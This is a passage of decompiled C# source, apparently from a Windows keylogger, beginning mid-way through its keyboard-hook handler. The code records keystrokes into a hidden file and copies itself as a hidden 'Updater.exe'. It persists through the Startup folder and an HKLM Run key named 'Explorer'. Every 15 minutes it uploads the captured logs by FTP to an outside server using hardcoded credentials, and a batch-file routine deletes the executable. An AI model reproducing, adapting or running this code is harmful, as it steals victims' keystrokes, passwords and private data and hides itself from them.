					goto IL_09ae;
					IL_066b:
					num = 175;
					text = "0";
					goto IL_09ae;
					IL_0659:
					num = 211;
					text = "[MENU]";
					goto IL_09ae;
					IL_0647:
					num = 208;
					text = "[RWindows]";
					goto IL_09ae;
					IL_0635:
					num = 205;
					text = "[LWindows]";
					goto IL_09ae;
					IL_0618:
					num = 28;
					text = Conversions.ToString(Strings.ChrW(checked(lParam.vkCode + 32)));
					goto IL_09ae;
					IL_05fe:
					num = 25;
					text = Conversions.ToString(Strings.ChrW(lParam.vkCode));
					goto IL_09ae;
					IL_05ef:
					num = 68;
					text = "[DEL]";
					goto IL_09ae;
					IL_05dd:
					num = 154;
					text = "[Insert]";
					goto IL_09ae;
					IL_05ce:
					num = 88;
					text = "[DArrow]";
					goto IL_09ae;
					IL_05bf:
					num = 85;
					text = "[RArrow]";
					goto IL_09ae;
					IL_05b0:
					num = 94;
					text = "[UArrow]";
					goto IL_09ae;
					IL_05a1:
					num = 91;
					text = "[LArrow]";
					goto IL_09ae;
					IL_058f:
					num = 151;
					text = "[Home]";
					goto IL_09ae;
					IL_057d:
					num = 142;
					text = "[END]";
					goto IL_09ae;
					IL_056b:
					num = 145;
					text = "[PageUp]";
					goto IL_09ae;
					IL_0559:
					num = 148;
					text = "[PageDown]";
					goto IL_09ae;
					IL_054a:
					num = 31;
					text = " ";
					goto IL_09ae;
					IL_053b:
					num = 71;
					text = "[ESC]";
					goto IL_09ae;
					IL_0504:
					num = 74;
					if (((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
					{
						goto IL_0519;
					}
					goto IL_0528;
					IL_0519:
					num = 75;
					text = "[/CAPS]";
					goto IL_09ae;
					IL_0528:
					num = 77;
					goto IL_052c;
					IL_052c:
					num = 78;
					text = "[CAPS]";
					goto IL_09ae;
					IL_04f2:
					num = 160;
					text = "[Pause]";
					goto IL_09ae;
					IL_04e3:
					num = 62;
					text = "\r\n";
					goto IL_09ae;
					IL_04d4:
					num = 65;
					text = " [TAB]";
					goto IL_09ae;
					IL_04c5:
					num = 97;
					text = "[BSpace]";
					goto IL_09ae;
					IL_0928:
					num = 217;
					if (wParam == 257 || wParam == 261)
					{
						goto IL_0942;
					}
					goto IL_09ae;
					IL_0942:
					num = 218;
					switch (lParam.vkCode)
					{
					case 160:
					case 161:
						break;
					case 162:
					case 163:
						goto IL_0983;
					case 164:
						goto IL_0992;
					case 165:
						goto IL_09a1;
					default:
						goto IL_09ae;
					}
					goto IL_0974;
					IL_09a1:
					num = 228;
					text = "[/ALT GR]";
					goto IL_09ae;
					IL_0992:
					num = 225;
					text = "[/ALT]";
					goto IL_09ae;
					IL_0983:
					num = 222;
					text = "[/CTRL]";
					goto IL_09ae;
					IL_0974:
					num = 231;
					text = "[/SHFT]";
					goto IL_09ae;
					end_IL_0000_2:
					break;
				}
				num = 235;
				num5 = CallNextHookEx((int)KeyboardHandle, Code, wParam, lParam);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 3531;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		int result = num5;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).set_ShowInTaskbar(false);
		AnimateWindow(ToTray: true);
	}

	private void btnStart_Click(object sender, EventArgs e)
	{
		Timer1.Start();
		HookKeyboard();
	}

	private void btnStop_Click(object sender, EventArgs e)
	{
		Timer1.Stop();
		UnhookKeyboard();
	}

	private void btnExit_Click(object sender, EventArgs e)
	{
		Timer1.Stop();
		((Form)this).Close();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		UnhookKeyboard();
	}

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SHAppBarMessage(int dwMessage, ref APPBARDATA pData);

	protected override void WndProc(ref Message m)
	{
		if (((Message)(ref m)).get_Msg() == 274 && ((Message)(ref m)).get_WParam().ToInt32() == 61472)
		{
			AnimateWindow(ToTray: true);
		}
		else
		{
			((Form)this).WndProc(ref m);
		}
	}

	private void Notify_DoubleClick(object sender, EventArgs e)
	{
		AnimateWindow(ToTray: false);
	}

	private void AnimateWindow(bool ToTray)
	{
		if (ToTray)
		{
			((Control)this).Hide();
			n.set_Visible(true);
		}
		else
		{
			n.set_Visible(false);
			((Control)this).Show();
		}
	}

	public bool IsProcessOpen(string name)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		while (true)
		{
			if (num < processes.Length)
			{
				Process process = processes[num];
				if (process.ProcessName.Contains(name))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return false;
		}
		return true;
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			Upload();
			Timer2.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Timer2.Start();
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			string text = null;
			string text2 = Conversions.ToString(Environment.OSVersion.Version.Major);
			text = ((!(Conversions.ToDouble(text2) >= 6.0)) ? (Environment.GetEnvironmentVariable("Temp") + "\\Explorer\\") : (Environment.GetEnvironmentVariable("Temp") + "\\"));
			string text3 = text + "keys.txt";
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text3, KeyLog, true);
			((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text3).Attributes |= FileAttributes.Hidden;
			KeyLog = null;
			Timer1.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Timer1.Start();
			ProjectData.ClearProjectError();
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		try
		{
			string text = null;
			string text2 = Conversions.ToString(Environment.OSVersion.Version.Major);
			text = ((!(Conversions.ToDouble(text2) >= 6.0)) ? (Environment.GetEnvironmentVariable("Temp") + "\\Explorer\\") : (Environment.GetEnvironmentVariable("Temp") + "\\"));
			string text3 = text + "keys.txt";
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text3, KeyLog, true);
			((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text3).Attributes |= FileAttributes.Hidden;
			KeyLog = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void frm_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		string sourceFileName = default(string);
		string destFileName = default(string);
		string sourceFileName2 = default(string);
		string text3 = default(string);
		FileInfo fileInfo = default(FileInfo);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		FileInfo fileInfo2 = default(FileInfo);
		RegistryKey registryKey = default(RegistryKey);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string sourceFileName3 = default(string);
		Process process = default(Process);
		string text7 = default(string);
		Process[] processesByName = default(Process[]);
		int num5 = default(int);
		int interval = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 1172:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_000e;
						case 4:
							goto IL_0026;
						case 5:
							goto IL_003a;
						case 6:
							goto IL_004e;
						case 7:
							goto IL_0067;
						case 8:
							goto IL_0078;
						case 9:
							goto IL_0084;
						case 11:
							goto IL_0095;
						case 12:
							goto IL_0099;
						case 13:
							goto IL_00ae;
						case 14:
							goto IL_00c8;
						case 15:
							goto IL_00d4;
						case 16:
							goto IL_00e6;
						case 17:
							goto IL_00f3;
						case 19:
							goto IL_0103;
						case 20:
							goto IL_0107;
						case 21:
							goto IL_0114;
						case 22:
							goto IL_012b;
						case 25:
							goto IL_0141;
						case 26:
							goto IL_0145;
						case 27:
							goto IL_0151;
						case 28:
							goto IL_0168;
						case 29:
							goto IL_017c;
						case 30:
							goto IL_0189;
						case 31:
							goto IL_01a0;
						case 18:
						case 23:
						case 24:
						case 32:
						case 33:
							goto IL_01b4;
						case 34:
							goto IL_01c9;
						case 35:
							goto IL_01df;
						case 10:
						case 36:
						case 37:
							goto IL_0200;
						case 38:
							goto IL_0214;
						case 39:
							goto IL_022d;
						case 40:
							goto IL_023e;
						case 41:
							goto IL_0249;
						case 42:
							goto IL_0259;
						case 43:
							goto IL_026e;
						case 44:
							goto IL_027a;
						case 45:
							goto IL_0285;
						case 46:
							goto IL_0296;
						case 47:
							goto IL_02a2;
						case 49:
							goto IL_02b0;
						case 50:
							goto IL_02b4;
						case 51:
							goto IL_02bf;
						case 52:
							goto IL_02d6;
						case 53:
							goto IL_02e3;
						case 54:
							goto IL_02ee;
						case 55:
							goto IL_02f9;
						case 57:
							goto IL_0304;
						case 58:
							goto IL_0308;
						case 59:
							goto IL_0310;
						case 60:
							goto IL_031e;
						case 61:
							goto IL_032f;
						case 62:
							goto IL_033a;
						case 63:
							goto IL_0345;
						case 64:
							goto IL_0354;
						case 65:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 48:
						case 56:
						case 66:
						case 67:
						case 68:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0354:
					num = 64;
					Timer2.Start();
					break;
					IL_0008:
					num = 2;
					text = null;
					goto IL_000e;
					IL_000e:
					num = 3;
					text2 = Conversions.ToString(Environment.OSVersion.Version.Major);
					goto IL_0026;
					IL_0026:
					num = 4;
					if (Conversions.ToDouble(text2) >= 6.0)
					{
						goto IL_003a;
					}
					goto IL_0095;
					IL_003a:
					num = 5;
					sourceFileName = Application.get_StartupPath() + "\\Updater.exe";
					goto IL_004e;
					IL_004e:
					num = 6;
					text = Environment.GetEnvironmentVariable("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
					goto IL_0067;
					IL_0067:
					num = 7;
					destFileName = text + "Updater.exe";
					goto IL_0078;
					IL_0078:
					num = 8;
					File.Copy(sourceFileName, destFileName);
					goto IL_0084;
					IL_0084:
					num = 9;
					staticsource = text;
					goto IL_0200;
					IL_0095:
					num = 11;
					goto IL_0099;
					IL_0099:
					num = 12;
					sourceFileName2 = Application.get_StartupPath() + "\\Updater.exe";
					goto IL_00ae;
					IL_00ae:
					num = 13;
					text = Environment.GetEnvironmentVariable("Temp") + "\\Explorer\\";
					goto IL_00c8;
					IL_00c8:
					num = 14;
					staticsource = text;
					goto IL_00d4;
					IL_00d4:
					num = 15;
					text3 = text + "Updater.exe";
					goto IL_00e6;
					IL_00e6:
					num = 16;
					if (Directory.Exists(text))
					{
						goto IL_00f3;
					}
					goto IL_0141;
					IL_00f3:
					num = 17;
					if (!File.Exists(text3))
					{
						goto IL_0103;
					}
					goto IL_01b4;
					IL_0103:
					num = 19;
					goto IL_0107;
					IL_0107:
					num = 20;
					File.Copy(sourceFileName2, text3);
					goto IL_0114;
					IL_0114:
					num = 21;
					fileInfo = ((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text3);
					goto IL_012b;
					IL_012b:
					num = 22;
					fileInfo.Attributes |= FileAttributes.Hidden;
					goto IL_01b4;
					IL_0141:
					num = 25;
					goto IL_0145;
					IL_0145:
					num = 26;
					Directory.CreateDirectory(text);
					goto IL_0151;
					IL_0151:
					num = 27;
					directoryInfo = ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectoryInfo(text);
					goto IL_0168;
					IL_0168:
					num = 28;
					directoryInfo.Attributes |= FileAttributes.Hidden;
					goto IL_017c;
					IL_017c:
					num = 29;
					File.Copy(sourceFileName2, text3);
					goto IL_0189;
					IL_0189:
					num = 30;
					fileInfo2 = ((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text3);
					goto IL_01a0;
					IL_01a0:
					num = 31;
					fileInfo2.Attributes |= FileAttributes.Hidden;
					goto IL_01b4;
					IL_01b4:
					num = 33;
					Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					goto IL_01c9;
					IL_01c9:
					num = 34;
					registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					goto IL_01df;
					IL_01df:
					num = 35;
					registryKey.SetValue("Explorer", "\"" + text3 + "\"");
					goto IL_0200;
					IL_0200:
					num = 37;
					text4 = Application.get_StartupPath() + "\\";
					goto IL_0214;
					IL_0214:
					num = 38;
					text5 = Environment.GetEnvironmentVariable("Temp") + "\\newtemp\\";
					goto IL_022d;
					IL_022d:
					num = 39;
					if (!text4.Contains("newtemp"))
					{
						goto IL_023e;
					}
					goto IL_02b0;
					IL_023e:
					num = 40;
					Directory.CreateDirectory(text5);
					goto IL_0249;
					IL_0249:
					num = 41;
					text6 = text5 + "Updater.exe";
					goto IL_0259;
					IL_0259:
					num = 42;
					sourceFileName3 = Application.get_StartupPath() + "\\Updater.exe";
					goto IL_026e;
					IL_026e:
					num = 43;
					File.Copy(sourceFileName3, text6);
					goto IL_027a;
					IL_027a:
					num = 44;
					process = new Process();
					goto IL_0285;
					IL_0285:
					num = 45;
					process.StartInfo.FileName = text6;
					goto IL_0296;
					IL_0296:
					num = 46;
					process.Start();
					goto IL_02a2;
					IL_02a2:
					num = 47;
					Application.Exit();
					goto end_IL_0000_3;
					IL_02b0:
					num = 49;
					goto IL_02b4;
					IL_02b4:
					num = 50;
					text7 = "Updater.exe";
					goto IL_02bf;
					IL_02bf:
					num = 51;
					text7 = text7.Replace(".exe", "");
					goto IL_02d6;
					IL_02d6:
					num = 52;
					processesByName = Process.GetProcessesByName(text7);
					goto IL_02e3;
					IL_02e3:
					num = 53;
					if (processesByName.Length > 1)
					{
						goto IL_02ee;
					}
					goto IL_0304;
					IL_02ee:
					num = 54;
					Thread.Sleep(100);
					goto IL_02f9;
					IL_02f9:
					num = 55;
					Application.Exit();
					goto end_IL_0000_3;
					IL_0304:
					num = 57;
					goto IL_0308;
					IL_0308:
					num = 58;
					num5 = 15;
					goto IL_0310;
					IL_0310:
					num = 59;
					interval = checked(num5 * 60000);
					goto IL_031e;
					IL_031e:
					num = 60;
					Timer2.set_Interval(interval);
					goto IL_032f;
					IL_032f:
					num = 61;
					((Form)this).set_WindowState((FormWindowState)1);
					goto IL_033a;
					IL_033a:
					num = 62;
					AnimateWindow(ToTray: true);
					goto IL_0345;
					IL_0345:
					num = 63;
					Timer1.Start();
					goto IL_0354;
					end_IL_0000_2:
					break;
				}
				num = 65;
				HookKeyboard();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1172;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Upload()
	{
		try
		{
			string text = null;
			string text2 = Conversions.ToString(Environment.OSVersion.Version.Major);
			text = ((!(Conversions.ToDouble(text2) >= 6.0)) ? (Environment.GetEnvironmentVariable("Temp") + "\\Explorer\\") : (Environment.GetEnvironmentVariable("Temp") + "\\"));
			string text3 = text + "keys.txt";
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text3, KeyLog, true);
			FileInfo fileInfo = new FileInfo(text3);
			string text4 = null;
			text4 = Environment.GetEnvironmentVariable("USERNAME");
			string text5 = DateAndTime.get_Now().Day.ToString();
			if (text5.Length == 1)
			{
				text5 = text5.Replace(text5, "0" + text5);
			}
			string text6 = DateAndTime.get_Now().Month.ToString();
			if (text6.Length == 1)
			{
				text6 = text6.Replace(text6, "0" + text6);
			}
			string text7 = DateAndTime.get_Now().Hour.ToString();
			if (text7.Length == 1)
			{
				text7 = text7.Replace(text7, "0" + text7);
			}
			string text8 = DateAndTime.get_Now().Minute.ToString();
			if (text8.Length == 1)
			{
				text8 = text8.Replace(text8, "0" + text8);
			}
			string text9 = text5 + text6 + "." + text7 + text8;
			string text10 = null;
			text10 = "ftp://ftp.linkitnow.net/" + text9 + "(" + text4 + ")logs.txt";
			if (fileInfo.Length > 10L)
			{
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(text10);
				ftpWebRequest.Credentials = new NetworkCredential("trial010@linkitnow.net", "7G3hcu&;:WSB");
				ftpWebRequest.Method = "STOR";
				byte[] array = File.ReadAllBytes(text3);
				Stream requestStream = ftpWebRequest.GetRequestStream();
				requestStream.Write(array, 0, array.Length);
				requestStream.Close();
				requestStream.Dispose();
				KeyLog = null;
				File.Delete(text3);
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text3, KeyLog, false);
				((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text3).Attributes |= FileAttributes.Hidden;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void deleteall_Click(object sender, EventArgs e)
	{
		deletealls();
		selfdestruct();
	}

	private void deletealls()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		RegistryKey registryKey = default(RegistryKey);
		string text = default(string);
		string text2 = default(string);
		string path = default(string);
		string path2 = default(string);
		string path3 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 417:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_000e;
						case 4:
							goto IL_0027;
						case 5:
							goto IL_003c;
						case 7:
							goto IL_0057;
						case 8:
							goto IL_005a;
						case 6:
						case 9:
						case 10:
							goto IL_0073;
						case 11:
							goto IL_0084;
						case 12:
							goto IL_0090;
						case 13:
						case 14:
							goto IL_009a;
						case 15:
							goto IL_00ab;
						case 16:
							goto IL_00b7;
						case 17:
						case 18:
							goto IL_00c1;
						case 19:
							goto IL_00d6;
						case 20:
							goto IL_00e2;
						case 21:
						case 22:
							goto IL_00ec;
						case 23:
							goto IL_0101;
						case 24:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 25:
						case 26:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0101:
					num = 23;
					if (registryKey.GetValue("Explorer") == null)
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0008:
					num = 2;
					text = null;
					goto IL_000e;
					IL_000e:
					num = 3;
					text2 = Conversions.ToString(Environment.OSVersion.Version.Major);
					goto IL_0027;
					IL_0027:
					num = 4;
					if (Conversions.ToDouble(text2) >= 6.0)
					{
						goto IL_003c;
					}
					goto IL_0057;
					IL_003c:
					num = 5;
					text = Environment.GetEnvironmentVariable("Temp") + "\\";
					goto IL_0073;
					IL_0057:
					num = 7;
					goto IL_005a;
					IL_005a:
					num = 8;
					text = Environment.GetEnvironmentVariable("Temp") + "\\Explorer\\";
					goto IL_0073;
					IL_0073:
					num = 10;
					path = text + "keys.txt";
					goto IL_0084;
					IL_0084:
					num = 11;
					if (File.Exists(path))
					{
						goto IL_0090;
					}
					goto IL_009a;
					IL_0090:
					num = 12;
					File.Delete(path);
					goto IL_009a;
					IL_009a:
					num = 14;
					path2 = text + "system";
					goto IL_00ab;
					IL_00ab:
					num = 15;
					if (File.Exists(path2))
					{
						goto IL_00b7;
					}
					goto IL_00c1;
					IL_00b7:
					num = 16;
					File.Delete(path2);
					goto IL_00c1;
					IL_00c1:
					num = 18;
					path3 = staticsource + "Updater.exe";
					goto IL_00d6;
					IL_00d6:
					num = 19;
					if (File.Exists(path3))
					{
						goto IL_00e2;
					}
					goto IL_00ec;
					IL_00e2:
					num = 20;
					File.Delete(path3);
					goto IL_00ec;
					IL_00ec:
					num = 22;
					registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
					goto IL_0101;
					end_IL_0000_2:
					break;
				}
				num = 24;
				registryKey.DeleteValue("Explorer", throwOnMissingValue: true);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 417;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void selfdestruct()
	{
		string text = Path.GetTempPath();
		if (!text.EndsWith("\\"))
		{
			text += "\\";
		}
		string text2 = "_uninsep.bat";
		string text3 = text + text2;
		string executablePath = Application.get_ExecutablePath();
		string text4 = ":Repeat\r\nATTRIB -H \"{executable}\"\r\ndel \"{executable}\"\r\nif exist \"{executable}\" goto Repeat\r\ndel \"{batFileFullPath}\"\r\n";
		text4 = text4.Replace("{executable}", executablePath);
		text4 = text4.Replace("{batFileFullPath}", text3);
		StreamWriter streamWriter = new StreamWriter(text3, append: false);
		streamWriter.Write(text4);
		streamWriter.Close();
		Process process = new Process();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = text3;
		process.Start();
		Application.Exit();
	}
}
